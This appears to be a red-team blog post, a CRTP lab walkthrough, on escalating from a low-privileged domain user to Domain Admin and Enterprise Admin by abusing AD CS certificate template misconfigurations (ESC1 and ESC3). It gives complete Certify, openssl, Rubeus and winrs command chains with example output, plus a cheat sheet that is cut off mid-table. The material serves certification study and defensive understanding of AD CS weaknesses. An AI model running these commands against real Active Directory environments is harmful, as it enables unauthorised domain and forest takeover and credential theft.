---
title: "CRTP Deep Dive: AD CS Abuse — ESC1 & ESC3 to Domain Admin and Enterprise Admin (OBJ 21)"
date: 2026-04-11 01:00:00 +0200
categories: [Red Team, CRTP]
tags: [adcs, esc1, esc3, certificates, pkinit, certify, rubeus, privilege-escalation, enterprise-admin, cross-domain]
description: "Abuse Active Directory Certificate Services misconfigurations (ESC1 and ESC3) to escalate from a low-privileged user to Domain Admin and Enterprise Admin across domain trusts."
image:
  path: /assets/img/posts/csr.png
pin: false
math: false
mermaid: false
---

> This blog covers **Learning Objective 21** from the CRTP course by Altered Security.
> All commands are **PowerShell / Windows only**. No Linux commands anywhere.
{: .prompt-info }

---

## What is AD CS?

**Active Directory Certificate Services (AD CS)** is a Windows Server role that brings a full **Public Key Infrastructure (PKI)** into your Active Directory forest. It issues digital certificates used for:

- Authenticating users and machines to the domain
- Encrypting files, emails, and disk volumes
- Signing documents and code
- Smart Card logon
- VPN and wireless authentication

```
┌──────────────────────────────────────────────────────────────────────┐
│                    AD CS — How It Fits Into AD                       │
│                                                                      │
│   Active Directory Forest: moneycorp.local                          │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │                                                               │  │
│  │   CA Server (mcorp-dc)                                        │  │
│  │   ┌──────────────────────────┐                                │  │
│  │   │  moneycorp-MCORP-DC-CA   │                                │  │
│  │   │  (Certificate Authority) │                                │  │
│  │   └────────────┬─────────────┘                                │  │
│  │                │  issues certificates                         │  │
│  │       ┌────────┴────────┐                                     │  │
│  │       ▼                 ▼                                     │  │
│  │   Users               Machines                                │  │
│  │  (TGT via PKINIT)   (Machine auth)                            │  │
│  │                                                               │  │
│  └───────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Key AD CS Terminology

```
┌──────────────────────────────────────────────────────────────────────┐
│                    AD CS Terminology Reference                       │
├─────────────────────────┬────────────────────────────────────────────┤
│ Term                    │ Meaning                                    │
├─────────────────────────┼────────────────────────────────────────────┤
│ CA                      │ Certification Authority — the server that  │
│                         │ issues and signs certificates              │
├─────────────────────────┼────────────────────────────────────────────┤
│ Certificate             │ Issued to a user or machine. Used for      │
│                         │ auth, encryption, signing                  │
├─────────────────────────┼────────────────────────────────────────────┤
│ CSR                     │ Certificate Signing Request — a client     │
│                         │ sends this to the CA asking for a cert     │
├─────────────────────────┼────────────────────────────────────────────┤
│ Certificate Template    │ Blueprint that defines settings: who can   │
│                         │ enroll, what EKUs it has, validity, etc.   │
├─────────────────────────┼────────────────────────────────────────────┤
│ EKU OID                 │ Extended Key Usage — defines what the cert │
│                         │ is allowed to do (Client Auth, Smart Card  │
│                         │ Logon, Certificate Request Agent, etc.)    │
├─────────────────────────┼────────────────────────────────────────────┤
│ PKINIT                  │ Kerberos extension that lets a user obtain │
│                         │ a TGT using a certificate instead of a     │
│                         │ password                                   │
├─────────────────────────┼────────────────────────────────────────────┤
│ Enrollment Agent        │ A cert with the "Certificate Request Agent"│
│                         │ EKU — lets you request certs ON BEHALF of  │
│                         │ other users                                │
└─────────────────────────┴────────────────────────────────────────────┘
```

---

## Why AD CS is Dangerous

```
┌──────────────────────────────────────────────────────────────────────────┐
│              AD CS Abuse Categories (Certified PreOwned)                 │
│                                                                          │
│  THEFT — Stealing existing certificates                                  │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  THEFT1  Export certs with private keys via Windows Crypto API     │  │
│  │  THEFT2  Extract user certs with private keys using DPAPI          │  │
│  │  THEFT3  Extract machine certs with private keys using DPAPI       │  │
│  │  THEFT4  Steal certificates from files and cert stores             │  │
│  │  THEFT5  Use PKINIT to retrieve NTLM hash from cert                │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  PERSIST — Certificate-based persistence                                 │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  PERSIST1  User persistence by requesting new certs                │  │
│  │  PERSIST2  Machine persistence by requesting new certs             │  │
│  │  PERSIST3  User/Machine persistence by renewing certs              │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ESCALATE — Privilege escalation via misconfigurations                   │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  ESC1  ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU                 │  │
│  │        → Request cert for ANY user including DA/EA                 │  │
│  │  ESC3  Enrollment Agent + App Policy requirement                   │  │
│  │        → Request cert ON BEHALF OF any user                        │  │
│  │  (ESC2–ESC8 and beyond exist — lab focuses on ESC1 and ESC3)      │  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Common Misconfiguration Requirements (ESC1 & ESC3)

For both ESC1 and ESC3 to be exploitable, ALL of these conditions must be true on the vulnerable template:

```
┌──────────────────────────────────────────────────────────────────────┐
│          Required Misconfigurations for ESC1 / ESC3                  │
│                                                                      │
│  ✅  CA grants normal/low-privileged users enrollment rights         │
│  ✅  Manager approval is DISABLED                                    │
│  ✅  Authorized signatures required = 0 (or bypassed via agent)      │
│  ✅  The template grants Domain Users (or RDPUsers) enrollment right │
│                                                                      │
│  + ESC1 specific:                                                    │
│  ✅  msPKI-Certificates-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT        │
│     (requestor can set ANY Subject Alternative Name in the cert)    │
│                                                                      │
│  + ESC3 specific:                                                    │
│  ✅  Template A: EKU = Certificate Request Agent                     │
│  ✅  Template B: Application Policy = Certificate Request Agent      │
│     (allows using Agent cert to request certs on behalf of others)  │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Tool: Certify

[Certify](https://github.com/GhostPack/Certify) is a C# tool from GhostPack for enumerating and abusing AD CS misconfigurations.

```
┌──────────────────────────────────────────────────────────────────────┐
│                    Certify — Key Commands                            │
├──────────────────────────────────────────────────────────────────────┤
│  Certify.exe cas                    List all Certificate Authorities │
│  Certify.exe find                   List all certificate templates   │
│  Certify.exe find /vulnerable       Only show vulnerable templates   │
│  Certify.exe find /enrolleeSupplies  Show ESC1-style templates       │
│  Subject                                                             │
│  Certify.exe request /ca:... /template:...   Request a certificate   │
│  Certify.exe request /onbehalfof:...         Request as other user   │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Step 0 — Enumerate AD CS

### Find the Certificate Authority

```powershell
C:\AD\Tools\Certify.exe cas
```

**Example Output:**
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[*] Root CAs

    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
```

> Note the CA name: `mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA` — you will use this in every request command.
{: .prompt-tip }

### Find All Templates

```powershell
C:\AD\Tools\Certify.exe find
```

This lists every template. Look for interesting EKUs, enrollment permissions, and name flags.

### Find Vulnerable Templates

```powershell
C:\AD\Tools\Certify.exe find /vulnerable
```

**Example Output (SmartCardEnrollment-Agent):**
```
[!] Vulnerable Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users          S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins         S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins     S-1-5-21-335606122-960912869-3279953914-519
```

> `Authorized Signatures Required: 0` + `Domain Users` enrollment right + `Certificate Request Agent` EKU = ESC3 vulnerable.
{: .prompt-warning }

### Find ESC1-style Templates

```powershell
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
```

**Example Output (HTTPSCertificates):**
```
    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : HTTPSCertificates
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\RDPUsers              S-1-5-21-719815819-3726368948-3917688648-1123
                                      mcorp\Domain Admins         S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins     S-1-5-21-335606122-960912869-3279953914-519
```

> `ENROLLEE_SUPPLIES_SUBJECT` + `Client Authentication` EKU + `RDPUsers` enrollment (your studentX is a member) = **ESC1 vulnerable**. You can request a cert for ANY user, including DA and EA.
{: .prompt-warning }

---

## ESC1 — Requestor Supplies Subject Name

### How ESC1 Works

```
┌──────────────────────────────────────────────────────────────────────────┐
│                     ESC1 — Attack Flow                                   │
│                                                                          │
│  Normal cert request:                                                    │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  User → CA: "Give me a cert for ME"                                │  │
│  │  CA sets Subject = current user (safe)                             │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ESC1 (ENROLLEE_SUPPLIES_SUBJECT):                                       │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Attacker (studentX, RDPUsers member)                              │  │
│  │       │                                                            │  │
│  │       ▼                                                            │  │
│  │  Certify.exe request /template:HTTPSCertificates                   │  │
│  │                       /altname:administrator                       │  │
│  │       │  CA trusts the requestor to set the Subject                │  │
│  │       ▼                                                            │  │
│  │  CA issues cert where Subject = Administrator                      │  │
│  │       │                                                            │  │
│  │       ▼                                                            │  │
│  │  Convert cert.pem → esc1-DA.pfx (openssl)                         │  │
│  │       │                                                            │  │
│  │       ▼                                                            │  │
│  │  Rubeus asktgt /certificate:esc1-DA.pfx (PKINIT)                  │  │
│  │       │  Kerberos accepts cert as proof of identity               │  │
│  │       ▼                                                            │  │
│  │  TGT issued for Administrator ✅ → DA access on dcorp-dc          │  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

---

### ESC1 → Domain Admin

#### Step 1 — Request Certificate for DA

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator /sid:S-1-5-21-719815819-3726368948-3917688648-500
```

**Parameter breakdown:**
```
┌─────────────────────────────────────────────────────────────────────┐
│               Certify request — Parameter Reference                 │
├──────────────────────────────┬──────────────────────────────────────┤
│ /ca:mcorp-dc...\...-CA       │ The CA to request the cert from      │
│ /template:HTTPSCertificates  │ The vulnerable template              │
│ /altname:administrator       │ Subject Alt Name = DA account        │
│ /sid:...-500                 │ SID of dcorp\administrator (RID 500) │
└──────────────────────────────┴──────────────────────────────────────┘
```

**Example Output:**
```
[*] Action: Request a Certificate

[*] Current user context    : dcorp\studentx
[*] No subject name specified, using current context as subject.

[*] Template                : HTTPSCertificates
[*] Subject                 : CN=studentx, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] AltName                 : administrator

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 18

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3gv6z7...
[snip]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
MIIFujCCA6KgAwIBAgITEAAA...
[snip]
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:21.3337806
```

> Copy everything from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` and save it as `C:\AD\Tools\esc1.pem`.
{: .prompt-tip }

---

#### Step 2 — Convert PEM to PFX

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```

**Example Output:**
```
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password: SecretPass@123
Verifying - Enter Export Password: SecretPass@123
```

> The warning about `openssl.cnf` is harmless — the conversion still works. Use `SecretPass@123` as the export password (used again in the Rubeus step).
{: .prompt-info }

---

#### Step 3 — Request DA TGT via PKINIT

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt
```

**Example Output:**
```
[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=studentx, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dollarcorp.moneycorp.local\administrator'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFujCCBbagAwIBBaEDAgEWooIEkDCCBIyhAwIBBaEP...

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/dollarcorp.moneycorp.local
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  4/11/2026 1:10:00 AM
  EndTime                  :  4/11/2026 11:10:00 AM
  RenewTill                :  4/18/2026 1:10:00 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
```

#### Step 4 — Verify DA Access

```powershell
winrs -r:dcorp-dc cmd /c set username
```

**Example Output:**
```
USERNAME=administrator
```

You now have Domain Admin privileges on `dollarcorp.moneycorp.local`.

---

### ESC1 → Enterprise Admin

Same process — just change `/altname` and `/sid` to point at the mcorp Administrator:

#### Step 1 — Request Certificate for EA

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator /sid:S-1-5-21-335606122-960912869-3279953914-500
```

> `/sid:S-1-5-21-335606122-960912869-3279953914-500` — this is `mcorp\administrator` (RID 500 in the parent domain).
{: .prompt-info }

Save the output to `esc1-EA.pem`.

#### Step 2 — Convert to PFX

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
```

#### Step 3 — Request EA TGT

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
```

> Note `/dc:mcorp-dc.moneycorp.local` — you must point Rubeus at the parent domain's DC since the cert is for a mcorp account.
{: .prompt-tip }

#### Step 4 — Verify EA Access

```powershell
winrs -r:mcorp-dc cmd /c set username
```

**Example Output:**
```
USERNAME=administrator
```

You now have Enterprise Admin privileges on `moneycorp.local`.

---

## ESC3 — Enrollment Agent Abuse

### How ESC3 Works

ESC3 requires **two vulnerable templates** working together:

```
┌──────────────────────────────────────────────────────────────────────────┐
│                     ESC3 — Two-Template Attack Flow                      │
│                                                                          │
│  Template A: SmartCardEnrollment-Agent                                   │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  EKU = Certificate Request Agent                                  │  │
│  │  Enrollment = Domain Users (you can request this!)                │  │
│  │  Purpose: Acts as an "enrollment proxy" for other users           │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                           ↓ Use this cert as your signing key            │
│  Template B: SmartCardEnrollment-Users                                   │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  EKU = Client Authentication                                      │  │
│  │  Application Policy = Certificate Request Agent (REQUIRED)        │  │
│  │  Authorized Signatures = 1 (requires the Agent cert to sign)      │  │
│  │  Purpose: Issues auth certs — but ONLY if signed by an Agent      │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                           ↓ Request ON BEHALF OF DA/EA                   │
│                                                                          │
│  Result: Auth cert issued for DA/EA, signed by your Agent cert ✅        │
└──────────────────────────────────────────────────────────────────────────┘
```

```
┌──────────────────────────────────────────────────────────────────────────┐
│                     ESC3 — Step-by-Step Visual                           │
│                                                                          │
│  studentX (Domain User)                                                  │
│       │                                                                  │
│       │  Step 1: Certify request /template:SmartCardEnrollment-Agent    │
│       ▼                                                                  │
│  CA issues "Enrollment Agent" cert (esc3-agent.pfx)                     │
│       │                                                                  │
│       │  Step 2: Certify request /template:SmartCardEnrollment-Users    │
│       │          /onbehalfof:dcorp\administrator                         │
│       │          /enrollcert:esc3-agent.pfx                              │
│       ▼                                                                  │
│  CA issues auth cert for dcorp\administrator (esc3-DA.pfx)              │
│  (signed & authorized by the Agent cert from step 1)                    │
│       │                                                                  │
│       │  Step 3: Rubeus asktgt /certificate:esc3-DA.pfx                 │
│       ▼                                                                  │
│  TGT issued for dcorp\administrator via PKINIT ✅                        │
└──────────────────────────────────────────────────────────────────────────┘
```

---

### ESC3 → Domain Admin

#### Step 1 — Request an Enrollment Agent Certificate

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

**Example Output:**
```
[*] Action: Request a Certificate

[*] Current user context    : dcorp\studentx
[*] Template                : SmartCardEnrollment-Agent

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 22

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAx7uFj...
[snip]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
MIIFDzCCAvegAwIBAgIT...
[snip]
-----END CERTIFICATE-----

Certify completed in 00:00:14.2108732
```

Save output to `esc3.pem`.

#### Step 2 — Convert to PFX

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

```
Enter Export Password: SecretPass@123
Verifying - Enter Export Password: SecretPass@123
```

---

#### Step 3 — Request Certificate on Behalf of DA

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

**Parameter breakdown:**
```
┌─────────────────────────────────────────────────────────────────────┐
│           Certify request /onbehalfof — Parameter Reference         │
├──────────────────────────────┬──────────────────────────────────────┤
│ /template:SmartCard...-Users │ The auth-capable template (Template B)│
│ /onbehalfof:dcorp\admin      │ Target user (DA) to get cert for     │
│ /enrollcert:esc3-agent.pfx   │ Your Enrollment Agent cert (step 2)  │
│ /enrollcertpw:SecretPass@123 │ Password for the agent PFX           │
└──────────────────────────────┴──────────────────────────────────────┘
```

**Example Output:**
```
[*] Action: Request a Certificates

[*] Current user context    : dcorp\studentx

[*] Template                : SmartCardEnrollment-Users
[*] On Behalf Of            : dcorp\administrator

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 24

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
[snip]
-----END CERTIFICATE-----

Certify completed in 00:00:16.5531092
```

Save output to `esc3-DA.pem`.

---

#### Step 4 — Convert DA Cert to PFX

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
```

---

#### Step 5 — Request DA TGT

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:SecretPass@123 /ptt
```

**Example Output:**
```
[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=studentx, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dollarcorp.moneycorp.local\administrator'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/dollarcorp.moneycorp.local
  UserName                 :  administrator
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  4/11/2026 1:25:00 AM
  EndTime                  :  4/11/2026 11:25:00 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
```

#### Step 6 — Verify DA Access

```powershell
winrs -r:dcorp-dc cmd /c set username
```

```
USERNAME=administrator
```

---

### ESC3 → Enterprise Admin

Only two commands change — point `/onbehalfof` at `mcorp\administrator` and point Rubeus at `mcorp-dc`:

#### Request EA Cert via Agent

```powershell
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
```

Save to `esc3-EA.pem`, convert:

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx
```

#### Request EA TGT

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```

#### Verify EA Access

```powershell
winrs -r:mcorp-dc cmd /c set username
```

```
USERNAME=administrator
```

---

## ESC1 vs ESC3 — Side-by-Side Comparison

```
┌──────────────────────────────────────────────────────────────────────────┐
│                   ESC1 vs ESC3 — Full Comparison                         │
├─────────────────────┬──────────────────────────┬─────────────────────────┤
│ Property            │ ESC1                     │ ESC3                    │
├─────────────────────┼──────────────────────────┼─────────────────────────┤
│ Templates needed    │ 1 (HTTPSCertificates)    │ 2 (Agent + Users)       │
├─────────────────────┼──────────────────────────┼─────────────────────────┤
│ Key flag            │ ENROLLEE_SUPPLIES_SUBJECT│ Certificate Request      │
│                     │                          │ Agent EKU               │
├─────────────────────┼──────────────────────────┼─────────────────────────┤
│ How you specify     │ /altname:administrator   │ /onbehalfof:dcorp\admin  │
│ target user         │ in the cert request      │ signed by Agent cert     │
├─────────────────────┼──────────────────────────┼─────────────────────────┤
│ Number of cert      │ 1 request + convert      │ 2 requests + 2 converts │
│ requests            │                          │                         │
├─────────────────────┼──────────────────────────┼─────────────────────────┤
│ Auth method         │ PKINIT (Rubeus asktgt)   │ PKINIT (Rubeus asktgt)  │
├─────────────────────┼──────────────────────────┼─────────────────────────┤
│ Enrollment rights   │ RDPUsers                 │ Domain Users            │
│ (in lab)            │ (studentX is member)     │ (any domain user works) │
├─────────────────────┼──────────────────────────┼─────────────────────────┤
│ Works for EA?       │ ✅ Yes (change /altname)  │ ✅ Yes (/onbehalfof mcorp)│
└─────────────────────┴──────────────────────────┴─────────────────────────┘
```

---

## PKINIT — How Certs Replace Passwords for Kerberos

```
┌──────────────────────────────────────────────────────────────────────────┐
│           PKINIT — Certificate-Based Kerberos Authentication             │
│                                                                          │
│  Normal password-based TGT request:                                      │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Client → KDC: AS-REQ encrypted with password hash                │  │
│  │  KDC → Client: AS-REP (TGT) if password correct                   │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  PKINIT certificate-based TGT request (RFC 4556):                        │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Client → KDC: AS-REQ with cert (signed using private key)        │  │
│  │  KDC verifies: cert is valid + issued by trusted CA               │  │
│  │  KDC verifies: Subject/SAN in cert matches requested user account │  │
│  │  KDC → Client: AS-REP (TGT) for the user named in the cert       │  │
│  │                                                                    │  │
│  │  ⚠ KDC does NOT check whether the private key belongs to the user │  │
│  │     named in the cert — it trusts the CA signature alone!         │  │
│  │  → This is why ESC1/ESC3 work: you have a valid CA-signed cert    │  │
│  │     with DA/EA as the Subject, so KDC issues a TGT for them.     │  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Quick Reference Cheat Sheet

```
┌──────────────────────────────────────────────────────────────────────────┐
│              AD CS Abuse — Full Cheat Sheet (OBJ 21)                     │
│                                                                          │
│  ── ENUMERATION ────────────────────────────────────────────────────── │
│                                                                          │
│  # Find CAs                                                              │
│  Certify.exe cas                                                         │
│                                                                          │
│  # Find all templates                                                    │
│  Certify.exe find                                                        │
│                                                                          │
│  # Find vulnerable templates (ESC1-ESC8)                                 │
│  Certify.exe find /vulnerable                                            │
│                                                                          │
│  # Find ESC1 templates (ENROLLEE_SUPPLIES_SUBJECT)                       │
│  Certify.exe find /enrolleeSuppliesSubject                               │
│                                                                          │
│  ── ESC1 → DA ──────────────────────────────────────────────────────── │
│                                                                          │
│  # Request cert with DA as altname                                       │
│  Certify.exe request                                                     │
│    /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA                   │
│    /template:HTTPSCertificates                                           │
│    /altname:administrator                                                │
│    /sid:S-1-5-21-719815819-3726368948-3917688648-500                    │
│                                                                          │
│  # Convert to PFX                                                        │
│  openssl.exe pkcs12 -in esc1.pem -keyex                                  │
│    -CSP "Microsoft Enhanced Cryptographic Provider v1.0"                 │
│    -export -out esc1-DA.pfx                                              │
│                                                                          │
│  # Get DA TGT via PKINIT                                                 │
│  Loader.exe -path Rubeus.exe -args asktgt                                │
│    /user:administrator /certificate:esc1-DA.pfx                         │
│    /password:SecretPass@123 /ptt                                         │
│                                                                          │
│  ── ESC1 → EA ──────────────────────────────────────────────────────── │
│                                                                          │
│  # Request cert with EA as altname                                       │
│  Certify.exe request                                                     │
│    /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA                   │
│    /template:HTTPSCertificates                                           │
│    /altname:moneycorp.local\administrator                                │
│    /sid:S-1-5-21-335606122-960912869-3279953914-500                     │
│                                                                          │
│  openssl.exe pkcs12 -in esc1-EA.pem -keyex                               │
│    -CSP "Microsoft Enhanced Cryptographic Provider v1.0"                 │
│    -export -out esc1-EA.pfx                                              │
│                                                                          │
│  Loader.exe -path Rubeus.exe -args asktgt                                │
│    /user:moneycorp.local\Administrator                                   │
│    /dc:mcorp-dc.moneycorp.local                                          │
│    /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt               │
│                                                                          │
│  ── ESC3 → DA ──────────────────────────────────────────────────────── │
│                                                                          │
│  # Step 1: Get Enrollment Agent cert                                     │
│  Certify.exe request                                                     │
│    /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA                   │
│    /template:SmartCardEnrollment-Agent                                   │
│  → save as esc3.pem → convert to esc3-agent.pfx                         │
│                                                                          │
│  # Step 2: Request DA cert using Agent cert                              │
│  Certify.exe request                                                     │
│    /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA                   │
│    /template:SmartCardEnrollment-Users                                   │
│    /onbehalfof:dcorp\administrator                                       │
│    /enrollcert:esc3-agent.pfx /enrollcertpw:SecretPass@123              │
│  → save as esc3-DA.pem → convert to esc3-DA.pfx                         │
│                                                                          │
│  # Step 3: Get DA TGT                                                    │
│  Loader.exe -path Rubeus.exe -args asktgt                                │
│    /user:administrator /certificate:esc3-DA.pfx                         │
│    /password:SecretPass@123 /ptt                                         │
│                                                                          │
│  ── ESC3 → EA ──────────────────────────────────────────────────────── │
│                                                                          │
│  # Reuse esc3-agent.pfx, change /onbehalfof                              │
│  Certify.exe request                                                     │
│    /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA                   │
│    /template:SmartCardEnrollment-Users                                   │
│    /onbehalfof:mcorp\administrator                                       │
│    /enrollcert:esc3-agent.pfx /enrollcertpw:SecretPass@123              │
│  → save as esc3-EA.pem → convert to esc3-EA.pfx                         │
│                                                                          │
│  Loader.exe -path Rubeus.exe -args asktgt                                │
│    /user:moneycorp.local\administrator                                   │
│    /dc:mcorp-dc.moneycorp.local                                          │
│    /certificate:esc3-EA.pfx /password:SecretPass@123 /ptt               │
│                                                                          │
│  ── KEY VALUES (CRTP LAB) ─────────────────────────────────────────── │
│                                                                          │
│  CA Name    : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA            │
